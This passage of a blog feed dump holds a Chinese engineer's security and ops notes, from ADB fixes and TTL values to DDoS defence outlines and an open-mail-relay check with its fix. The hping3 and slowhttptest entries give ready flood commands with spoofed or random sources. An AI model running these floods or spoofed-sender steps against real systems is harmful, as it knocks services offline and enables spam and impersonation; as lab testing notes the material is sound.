10.0.19045</p><p>platform-tools ADB：Android Debug Bridge version 1.0.41</p><p>模拟器ADB：Android Debug Bridge version 1.0.36</p><p>platform-tools ADB执行 adb devices 提示</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-built_in">C</span><span class="hljs-operator">:</span>\<span class="hljs-variable">Users</span>\<span class="hljs-variable">admin</span><span class="hljs-operator">&gt;</span><span class="hljs-variable">adb</span> <span class="hljs-variable">devices</span><br><span class="hljs-built_in">List</span> <span class="hljs-variable">of</span> <span class="hljs-variable">devices</span> <span class="hljs-variable">attached</span><br></code></pre></td></tr></table></figure><h3 id="临时解决方案"><a href="#临时解决方案" class="headerlink" title="临时解决方案"></a>临时解决方案</h3><p>kill 掉platform-tools ADB进程，使用模拟器ADB连接模拟器</p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>mobilesec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>sectools</tag>
      
      <tag>mobilesec</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>weibo视频下载</title>
    <link href="/2024/10/28/yunwei/tips/weibo%E8%A7%86%E9%A2%91%E4%B8%8B%E8%BD%BD/"/>
    <url>/2024/10/28/yunwei/tips/weibo%E8%A7%86%E9%A2%91%E4%B8%8B%E8%BD%BD/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>下载微博中的视频文件，客户端被禁止下载</p><p>1、复制视频短链接</p><p>右击视频，复制视频短链接</p><p><a href="http://t.cn/A6TEMuJJ">http://t.cn/A6TEMuJJ</a></p><p>2、解析短链接，获取实际链接（需要登录状态）</p><p>访问短链接<a href="http://t.cn/A6TEMuJJ%EF%BC%8C%E8%8E%B7%E5%8F%96%E5%88%B0%E5%AE%9E%E9%99%85%E9%93%BE%E6%8E%A5https://weibo.com/tv/show/1034:5026030381891614?from=old_pc_videoshow">http://t.cn/A6TEMuJJ，获取到实际链接https://weibo.com/tv/show/1034:5026030381891614?from=old_pc_videoshow</a></p><p>3、firefox浏览器访问实际链接，另存视频即可下载</p>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>commands</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>tips</tag>
      
      <tag>commands</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ddos_protection</title>
    <link href="/2024/10/28/security/netSec/ddos/ddos_protection/"/>
    <url>/2024/10/28/security/netSec/ddos/ddos_protection/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="防御方案"><a href="#防御方案" class="headerlink" title="防御方案"></a>防御方案</h1><h2 id="预防与检测"><a href="#预防与检测" class="headerlink" title="预防与检测"></a>预防与检测</h2><p>边界加固</p><p>​</p><p>边界流量分析</p><p>​对网络流量进行监测，及时有效发现异常流量</p><h2 id="应急响应与恢复"><a href="#应急响应与恢复" class="headerlink" title="应急响应与恢复"></a>应急响应与恢复</h2><p>防御工具</p><p>制定应急响应方案</p><h2 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h2><p>定期演练</p><p>优化更新防护策略</p><p>参考资源</p><p>【1】建立灵活响应的DDoS攻击应急响应机制的策略与实践 服务器租用 2024-04-17</p><p><a href="https://www.scmsky.com/helpcenter/safe/4862.html">https://www.scmsky.com/helpcenter/safe/4862.html</a></p><h1 id="防护技术"><a href="#防护技术" class="headerlink" title="防护技术"></a>防护技术</h1><h2 id="防护触发机制"><a href="#防护触发机制" class="headerlink" title="防护触发机制"></a>防护触发机制</h2><p>检测SYN、ACK、UDP、ICMP等协议每秒数据包数量（pps），达到阈值触发防护</p><h2 id="防护动作"><a href="#防护动作" class="headerlink" title="防护动作"></a>防护动作</h2><h3 id="限速"><a href="#限速" class="headerlink" title="限速"></a>限速</h3><h3 id="拦截"><a href="#拦截" class="headerlink" title="拦截"></a>拦截</h3><h3 id="区域防护（GenIP）"><a href="#区域防护（GenIP）" class="headerlink" title="区域防护（GenIP）"></a>区域防护（GenIP）</h3><p>限制指定区域访问策略，动作为限速、拦截</p><h3 id="异常数据包防护"><a href="#异常数据包防护" class="headerlink" title="异常数据包防护"></a>异常数据包防护</h3><p>过滤无效SYN数据包</p><h1 id="防护方案"><a href="#防护方案" class="headerlink" title="防护方案"></a>防护方案</h1><h2 id="方案问题"><a href="#方案问题" class="headerlink" title="方案问题"></a>方案问题</h2><h3 id="CDN-WAF"><a href="#CDN-WAF" class="headerlink" title="CDN+WAF"></a>CDN+WAF</h3><h4 id="方案细节"><a href="#方案细节" class="headerlink" title="方案细节"></a>方案细节</h4><p>CDN防护流量型攻击</p><p>WAF防护CC等消耗型攻击</p><h4 id="方案问题-1"><a href="#方案问题-1" class="headerlink" title="方案问题"></a>方案问题</h4><h2 id="技术名词"><a href="#技术名词" class="headerlink" title="技术名词"></a>技术名词</h2><h3 id="DCDN"><a href="#DCDN" class="headerlink" title="DCDN"></a>DCDN</h3>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>netSec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>netSec</tag>
      
      <tag>ddos</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>tcp_ack_flood</title>
    <link href="/2024/10/28/security/netSec/ddos/tcp_ack_flood/"/>
    <url>/2024/10/28/security/netSec/ddos/tcp_ack_flood/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>发送大量伪造源IP的ACK报文，消耗目标的会话资源</p><h2 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h2><h3 id="Large-ACK-Flood"><a href="#Large-ACK-Flood" class="headerlink" title="Large ACK Flood"></a>Large ACK Flood</h3><p>向目标IP发送大量携带大Payload的ACK报文，既可以消耗攻击目标的会话资源，也可以消耗带宽资源，由于攻击报文大小明显大于正常报文，因此称为 Large ACK Flood</p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>netSec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>netSec</tag>
      
      <tag>ddos</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pdf_to_word</title>
    <link href="/2024/10/28/yunwei/tips/pdf_to_word/"/>
    <url>/2024/10/28/yunwei/tips/pdf_to_word/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><p><a href="http://www.adobe.com/acrobat/online/pdf-to-word.html">www.adobe.com/acrobat/online/pdf-to-word.html</a></p><p><a href="http://www.adobe.com/acrobat/online/pdf-to-ppt.html">www.adobe.com/acrobat/online/pdf-to-ppt.html</a></p><p><a href="http://www.adobe.com/acrobat/online/pdf-to-excel.html">www.adobe.com/acrobat/online/pdf-to-excel.html</a></p><p><img src="/2024/10/28/yunwei/tips/pdf_to_word/image-20241025202907864.png" alt="image-20241025202907864"></p>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>commands</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>commands</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ttl</title>
    <link href="/2024/10/28/yunwei/tips/%E5%B8%B8%E8%A7%81%E8%AE%BE%E5%A4%87TTL/"/>
    <url>/2024/10/28/yunwei/tips/%E5%B8%B8%E8%A7%81%E8%AE%BE%E5%A4%87TTL/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="TTL说明"><a href="#TTL说明" class="headerlink" title="TTL说明"></a>TTL说明</h2><p>Time To Live，生存时间</p><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>限制IP数据包在网络中传输的最大跳数（路由器数量）</p><p>每当IP数据包通过一个路由器时，其TTL值减1</p><p>如果TTL值减为0，路由器会丢弃该数据包，并向发送端返回一个ICMP错误消息，通知发送端数据包被丢弃</p><h3 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h3><p>确保IP数据包不会无限制地在网络中循环，避免因路由环路（routing loop）而造成网络拥塞或资源浪费</p><p>用于估算数据包从发送端到目标主机的路径的长度（通过TTL递减次数），尽管具体路径会因网络拓扑结构而异</p><h2 id="ping-ttl说明"><a href="#ping-ttl说明" class="headerlink" title="ping ttl说明"></a>ping ttl说明</h2><p>在执行PING命令时，PING会发送一个ICMP回显请求（Echo Request）到目标主机</p><p>接收到请求的目标主机会返回一个ICMP回显应答（Echo Reply）</p><h2 id="常见设备TTL"><a href="#常见设备TTL" class="headerlink" title="常见设备TTL"></a>常见设备TTL</h2><h3 id="Windows-128"><a href="#Windows-128" class="headerlink" title="Windows 128"></a>Windows 128</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs routeros">C:\WINDOWS\system32&gt;ping -c 1 127.0.0.1<br><br>正在<span class="hljs-built_in"> Ping </span>127.0.0.1 具有 32 字节的数据:<br>来自 127.0.0.1 的回复: 字节=32 时间&lt;1ms <span class="hljs-attribute">TTL</span>=128<br>来自 127.0.0.1 的回复: 字节=32 时间&lt;1ms <span class="hljs-attribute">TTL</span>=128<br>来自 127.0.0.1 的回复: 字节=32 时间&lt;1ms <span class="hljs-attribute">TTL</span>=128<br>来自 127.0.0.1 的回复: 字节=32 时间&lt;1ms <span class="hljs-attribute">TTL</span>=128<br></code></pre></td></tr></table></figure><h3 id="Mac-64"><a href="#Mac-64" class="headerlink" title="Mac 64"></a>Mac 64</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">➜  ~<span class="hljs-built_in"> ping </span>localhost<span class="hljs-built_in"></span><br><span class="hljs-built_in">PING </span>localhost (127.0.0.1): 56 data bytes<br>64 bytes <span class="hljs-keyword">from</span> 127.0.0.1: <span class="hljs-attribute">icmp_seq</span>=0 <span class="hljs-attribute">ttl</span>=64 <span class="hljs-attribute">time</span>=0.070 ms<br>64 bytes <span class="hljs-keyword">from</span> 127.0.0.1: <span class="hljs-attribute">icmp_seq</span>=1 <span class="hljs-attribute">ttl</span>=64 <span class="hljs-attribute">time</span>=0.142 ms<br></code></pre></td></tr></table></figure><h3 id="iPhone-64"><a href="#iPhone-64" class="headerlink" title="iPhone 64"></a>iPhone 64</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">➜  ~<span class="hljs-built_in"> ping </span>10.223.28.13<span class="hljs-built_in"></span><br><span class="hljs-built_in">PING </span>10.223.28.13 (10.223.28.13): 56 data bytes<br>64 bytes <span class="hljs-keyword">from</span> 10.223.28.13: <span class="hljs-attribute">icmp_seq</span>=0 <span class="hljs-attribute">ttl</span>=63 <span class="hljs-attribute">time</span>=67.655 ms<br>64 bytes <span class="hljs-keyword">from</span> 10.223.28.13: <span class="hljs-attribute">icmp_seq</span>=1 <span class="hljs-attribute">ttl</span>=63 <span class="hljs-attribute">time</span>=87.895 ms<br></code></pre></td></tr></table></figure><h3 id="安卓-64"><a href="#安卓-64" class="headerlink" title="安卓 64"></a>安卓 64</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">➜  ~<span class="hljs-built_in"> ping </span>10.223.28.5       <span class="hljs-built_in"></span><br><span class="hljs-built_in">PING </span>10.223.28.5 (10.223.28.5): 56 data bytes<br>64 bytes <span class="hljs-keyword">from</span> 10.223.28.5: <span class="hljs-attribute">icmp_seq</span>=0 <span class="hljs-attribute">ttl</span>=63 <span class="hljs-attribute">time</span>=48.917 ms<br>64 bytes <span class="hljs-keyword">from</span> 10.223.28.5: <span class="hljs-attribute">icmp_seq</span>=1 <span class="hljs-attribute">ttl</span>=63 <span class="hljs-attribute">time</span>=69.429 ms<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>commands</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>tips</tag>
      
      <tag>commands</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>查看服务器出口IP</title>
    <link href="/2024/10/25/yunwei/tips/Linux/%E6%9F%A5%E7%9C%8B%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%87%BA%E5%8F%A3IP/"/>
    <url>/2024/10/25/yunwei/tips/Linux/%E6%9F%A5%E7%9C%8B%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%87%BA%E5%8F%A3IP/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><p><strong>curl ifconfig.me</strong></p><p>(base) [root@aliyun-1_1_1_1 ~]# curl ifconfig.me 1.1.1.1(base) [root@aliyun-1_1_1_1 ~]#</p>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>commands</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>tips</tag>
      
      <tag>commands</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/07/26/security/netSec/ddos/tcp_finrst_flood/"/>
    <url>/2024/07/26/security/netSec/ddos/tcp_finrst_flood/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/07/18/security/mailsec/mail_base/"/>
    <url>/2024/07/18/security/mailsec/mail_base/</url>
    
    <content type="html"><![CDATA[<h2 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h2><h3 id="SMTP常见端口"><a href="#SMTP常见端口" class="headerlink" title="SMTP常见端口"></a>SMTP常见端口</h3><p>TCP 25端口</p><p>TCP 587端口，加密端口，STARTTLS协议，属于TLS通讯协议，在STARTTLS命令执行后对原文加密</p><p>TCP 465端口，加密端口，SMTPS（SMTP-over-SSL）</p><h3 id="POP3常见端口"><a href="#POP3常见端口" class="headerlink" title="POP3常见端口"></a>POP3常见端口</h3><p>TCP 110端口</p><p>TCP 995端口</p><h3 id="EXCHANGE常见端口"><a href="#EXCHANGE常见端口" class="headerlink" title="EXCHANGE常见端口"></a>EXCHANGE常见端口</h3><p>TCP 587端口</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/07/18/security/secvulns/mail-mta/mailsec_mta_unauth/"/>
    <url>/2024/07/18/security/secvulns/mail-mta/mailsec_mta_unauth/</url>
    
    <content type="html"><![CDATA[<h2 id="漏洞名称"><a href="#漏洞名称" class="headerlink" title="漏洞名称"></a>漏洞名称</h2><p>MTA Open Mail Relaying Allowed</p><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>MTA开放邮件中继功能，可以直接telnet登录，没有身份验证，可以伪造邮件来源、或者被用作垃圾邮件的发送</p><h2 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h2><p>1、使用telnet连接邮件服务器</p><p>telnet smtp.example.com 25</p><p>telnet smtp.example.com 875</p><p>建立成功会收到欢迎消息</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs livescript">[root@localhost /]<span class="hljs-comment"># telnet  smtp.example.com 587</span><br>Trying <span class="hljs-number">1.1</span>.<span class="hljs-number">1.1</span>...<br>Connected <span class="hljs-keyword">to</span> <span class="hljs-number">1.1</span>.<span class="hljs-number">1.1</span>.<br>Escape character <span class="hljs-keyword">is</span> <span class="hljs-string">&#x27;^]&#x27;</span>.<br><span class="hljs-number">220</span> 邮件服务器信息 ESMTP<br></code></pre></td></tr></table></figure><p>2、发送HELO&#x2F;EHLO命令</p><p>告知服务器进行连接的主机名，通常是计算机名或者域名</p><p>HELO localhost</p><p>服务器一般会回应确认消息，例如</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">HELO</span> localhost<br><span class="hljs-number">250</span> 邮件服务器信息<br></code></pre></td></tr></table></figure><p>注意：</p><p>如果需要使用STARTTLS加密连接，需要在发送邮件之前，执行 “STARTTLS”命令</p><p>3、指定发件人</p><p>MAIL FROM:<a href="mailto:&#x66;&#x61;&#x6a;&#x69;&#97;&#110;&#x72;&#101;&#110;&#x40;&#101;&#x78;&#x61;&#109;&#112;&#x6c;&#x65;&#x2e;&#x63;&#111;&#x6d;">&#x66;&#x61;&#x6a;&#x69;&#97;&#110;&#x72;&#101;&#110;&#x40;&#101;&#x78;&#x61;&#109;&#112;&#x6c;&#x65;&#x2e;&#x63;&#111;&#x6d;</a></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-variable constant_">MAIL</span> <span class="hljs-variable constant_">FROM</span><span class="hljs-symbol">:fajianren</span><span class="hljs-variable">@example</span>.com<br><span class="hljs-number">250</span> ok<br></code></pre></td></tr></table></figure><p>4、指定收件人</p><p>RCRT TO:<a href="mailto:&#115;&#x68;&#111;&#117;&#106;&#105;&#97;&#x6e;&#x72;&#x65;&#x6e;&#64;&#101;&#120;&#97;&#x70;&#x6d;&#x6c;&#101;&#x2e;&#99;&#x6f;&#x6d;">&#115;&#x68;&#111;&#117;&#106;&#105;&#97;&#x6e;&#x72;&#x65;&#x6e;&#64;&#101;&#120;&#97;&#x70;&#x6d;&#x6c;&#101;&#x2e;&#99;&#x6f;&#x6d;</a></p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit">RCPT <span class="hljs-keyword">TO</span>:shoujianren<span class="hljs-symbol">@exapmle</span>.com<br><span class="hljs-number">250</span> ok<br></code></pre></td></tr></table></figure><p>5、发送数据</p><p>DATA</p><p>服务器回应</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf">DATA<br><span class="hljs-number">354</span> End data with &lt;<span class="hljs-keyword">CR</span>&gt;&lt;<span class="hljs-keyword">LF</span>&gt;.&lt;<span class="hljs-keyword">CR</span>&gt;&lt;<span class="hljs-keyword">LF</span>&gt;<br></code></pre></td></tr></table></figure><p>输入邮件头和正文，结束时输入两个换行符（<code>.</code>）</p><figure class="highlight d"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs d">From: fajianren<span class="hljs-keyword">@example</span>.com<br>To: shoujianren<span class="hljs-keyword">@example</span>.com<br>Subject: Test email via Telnet<br><br>This <span class="hljs-keyword">is</span> the <span class="hljs-keyword">body</span> of the email.<br>.<br><br></code></pre></td></tr></table></figure><p>服务器回应</p><figure class="highlight d"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs d">From: fajianren<span class="hljs-keyword">@example</span>.com<br>To: shoujianren<span class="hljs-keyword">@example</span>.com<br>Subject: Test email via Telnet<br><br>This <span class="hljs-keyword">is</span> the <span class="hljs-keyword">body</span> of the email.<br>.<br><span class="hljs-number">250</span> ok queue id <span class="hljs-number">6242603408352</span><br></code></pre></td></tr></table></figure><p>6、关闭连接</p><p>quit</p><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">1、telnet到服务器后要做一次身份验证，验证通过后才能允许发送邮件。注意：不要用垃圾邮件的策略对邮件的来源进行匹配判断，这是解决不了这个问题的<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>icmp_flood</title>
    <link href="/2024/07/08/security/netSec/ddos/icmp_flood/"/>
    <url>/2024/07/08/security/netSec/ddos/icmp_flood/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h2><p>攻击者发送大量伪造源IP的重定向报文、主机不可达报文、超时消息报文等ICMP报文，消耗链路带宽</p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>netSec</category>
      
      <category>ddos</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>netSec</tag>
      
      <tag>ddos</tag>
      
      <tag>icmpflood</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/06/27/security/netSec/ddos/ddos_tools/slowloris/"/>
    <url>/2024/06/27/security/netSec/ddos/ddos_tools/slowloris/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/06/26/security/netSec/ddos/ddos_tools/slowhttptest/"/>
    <url>/2024/06/26/security/netSec/ddos/ddos_tools/slowhttptest/</url>
    
    <content type="html"><![CDATA[<h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><h4 id="c-connections"><a href="#c-connections" class="headerlink" title="-c connections"></a>-c connections</h4><p>target number of connections (50) 连接数，默认50</p><h4 id="H"><a href="#H" class="headerlink" title="-H"></a>-H</h4><p>slow headers a.k.a. Slowloris (default) 指定在标头部分或消息正文中放慢速度</p><h4 id="i-seconds"><a href="#i-seconds" class="headerlink" title="-i seconds"></a>-i seconds</h4><p>interval between followup data in seconds (10) </p><p>每个连接的后续数据之间的间隔，单位秒</p><h4 id="r-rate"><a href="#r-rate" class="headerlink" title="-r rate"></a>-r rate</h4><p>connections per seconds (50)</p><p>每秒请求速率</p><h4 id="t-verb"><a href="#t-verb" class="headerlink" title="-t verb"></a>-t verb</h4><p>verb to use in request, default to GET for slow headers and response and to POST for slow body</p><p>设置请求动作，默认GET请求、用于慢速请求头，POST请求，用于慢速请求体</p><h4 id="u-URL"><a href="#u-URL" class="headerlink" title="-u URL"></a>-u URL</h4><p>absolute URL of target (<a href="http://localhost/">http://localhost/</a>)</p><p>指定目标URL</p><h4 id="x-bytes"><a href="#x-bytes" class="headerlink" title="-x bytes"></a>-x bytes</h4><p>max length of each randomized name&#x2F;value pair of followup data per tick, e.g. -x 2 generates X-xx: xx for header or &amp;xx&#x3D;xx for body, where x is random character (32)</p><p>请求数据的最大字节长度</p><h4 id="p-seconds"><a href="#p-seconds" class="headerlink" title="-p seconds"></a>-p seconds</h4><p>timeout to wait for HTTP response on probe connection,after which server is considered inaccessible (5)</p><p>响应超时时间，超过该时间认为服务不可访问</p><h4 id="l-seconds"><a href="#l-seconds" class="headerlink" title="-l seconds"></a>-l seconds</h4><p>target test length in seconds (240)</p><p>测试持续时间，单位秒</p><h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p>slowhttptest -c 50000 -H -i 2 -r 200 -t GET -u <a href="http://10.1.3.221/">http://10.1.3.221</a> -x 24 -p 3 -l 60000</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/06/26/security/netSec/ddos/ddos_tools/hping3/"/>
    <url>/2024/06/26/security/netSec/ddos/ddos_tools/hping3/</url>
    
    <content type="html"><![CDATA[<p>攻击IP  10.185.16.237</p><p>被攻击IP  10.185.6.137</p><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><h4 id="S-–syn"><a href="#S-–syn" class="headerlink" title="-S –syn"></a>-S –syn</h4><p>set SYN flag  设置SYN标记，也就是发SYN数据包</p><h4 id="i-–interval"><a href="#i-–interval" class="headerlink" title="-i  –interval"></a>-i  –interval</h4><p>wait (uX for X microseconds, for example -i u1000)  </p><p>​ –fast  alias for -i u10000 (10 packets for second) 每秒10个数据包</p><p>​     –faster   alias for -i u1000 (100 packets for second)      每秒100个数据包</p><p>​     –flood   sent packets as fast as possible. Don’t show replies.  以尽可能快的速度发送数据包 </p><h4 id="p-–destport"><a href="#p-–destport" class="headerlink" title="-p –destport"></a>-p –destport</h4><p>[+][+]<port> destination port(default 0) ctrl+z inc&#x2F;dec  目的IP，默认为0</p><h4 id="s-–baseport"><a href="#s-–baseport" class="headerlink" title="-s –baseport"></a>-s –baseport</h4><p>base source port             (default random)  随机源端口</p><h4 id="k-–keep"><a href="#k-–keep" class="headerlink" title="-k –keep"></a>-k –keep</h4><p>keep still source port 保持源端口</p><h4 id="–tcp-timestamp"><a href="#–tcp-timestamp" class="headerlink" title="–tcp-timestamp"></a>–tcp-timestamp</h4><p>enable the TCP timestamp option to guess the HZ&#x2F;uptime</p><h4 id="L-–setack"><a href="#L-–setack" class="headerlink" title="-L –setack"></a>-L –setack</h4><p>set TCP ack 设置ACK标记</p><h4 id="a-–spoof"><a href="#a-–spoof" class="headerlink" title="-a –spoof"></a>-a –spoof</h4><p>spoof source address</p><p>伪造源IP</p><h4 id="c-–count"><a href="#c-–count" class="headerlink" title="-c –count"></a>-c –count</h4><p>packet count</p><p>指定发送数据包数量</p><h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><h4 id="syn-flood"><a href="#syn-flood" class="headerlink" title="syn flood"></a>syn flood</h4><p>尽设备最大性能攻击，150K pps左右攻击量</p><p>hping3  目标IP -S -p 目标端口 –flood –rand-source</p><p>指定每秒发送数据包数量，每秒10000请求</p><p>hping3  目标IP -S -p 目标端口 -i u10000 –rand-source</p><h4 id="tcp-Fragment（分片）"><a href="#tcp-Fragment（分片）" class="headerlink" title="tcp Fragment（分片）"></a>tcp Fragment（分片）</h4><p>syn分片</p><p>hping3 –syn –flood 目标IP  –rand-source -p 目标端口 -d  数据大小</p><p>hping3 –syn –flood 10.185.6.137 –rand-source -p 22 -d 2000</p><h4 id="udp-flood"><a href="#udp-flood" class="headerlink" title="udp flood"></a>udp flood</h4><p>尽设备最大性能攻击</p><p>hping3 目标IP -2 –flood –rand-source -d 数据大小 -p 80</p><h4 id="icmp-flood"><a href="#icmp-flood" class="headerlink" title="icmp flood"></a>icmp flood</h4><p>源目的相同</p><p>hping3 目标IP -a 目标IP –icmp –flood</p><p>死亡ping</p><p>hping3 目标IP –icmp -d 数据包大小</p><p>以太网MTU为 1500 字节</p><h4 id="fin-flood"><a href="#fin-flood" class="headerlink" title="fin flood"></a>fin flood</h4><p>hping3 –fin –flood 目标IP –rand-source -p 目标端口</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim">[root@localhost ~]# hping3 --<span class="hljs-keyword">fin</span> --flood 目标IP --rand-<span class="hljs-keyword">source</span> -<span class="hljs-keyword">p</span> <span class="hljs-number">22</span><br>HPING 目标IP (ens3f1 目标IP): F <span class="hljs-keyword">set</span>, <span class="hljs-number">40</span> headers + <span class="hljs-number">0</span> data bytes<br>hping in flood <span class="hljs-keyword">mode</span>, <span class="hljs-keyword">no</span> replies will <span class="hljs-keyword">be</span> shown<br></code></pre></td></tr></table></figure><h4 id="tcp-rst-flood"><a href="#tcp-rst-flood" class="headerlink" title="tcp rst flood"></a>tcp rst flood</h4><p>hping3 –rst –flood 目标IP –rand-source -p 22</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim">HPING 目标IP (ens3f1 目标IP): R <span class="hljs-keyword">set</span>, <span class="hljs-number">40</span> headers + <span class="hljs-number">0</span> data bytes<br>hping in flood <span class="hljs-keyword">mode</span>, <span class="hljs-keyword">no</span> replies will <span class="hljs-keyword">be</span> shown<br></code></pre></td></tr></table></figure><h4 id="DNS-query-flood"><a href="#DNS-query-flood" class="headerlink" title="DNS query flood"></a>DNS query flood</h4><p>hping3 –udp –flood 目标IP -a 伪造源IP -p 53 -k</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-attr">[root@localhost ~]</span># hping3 <span class="hljs-attr">--udp</span> <span class="hljs-attr">--flood</span> 目标IP -<span class="hljs-selector-tag">a</span> <span class="hljs-number">5.5</span>.<span class="hljs-number">5.5</span> -<span class="hljs-selector-tag">p</span> <span class="hljs-number">53</span> -k<br>HPING 目标IP (ens3f1 目标IP): udp mode set, <span class="hljs-number">28</span> headers + <span class="hljs-number">0</span> data bytes<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/06/17/security/secvulns/springboot/SpringBoot_Actuator_env%20%E7%AB%AF%E7%82%B9%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
    <url>/2024/06/17/security/secvulns/springboot/SpringBoot_Actuator_env%20%E7%AB%AF%E7%82%B9%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/</url>
    
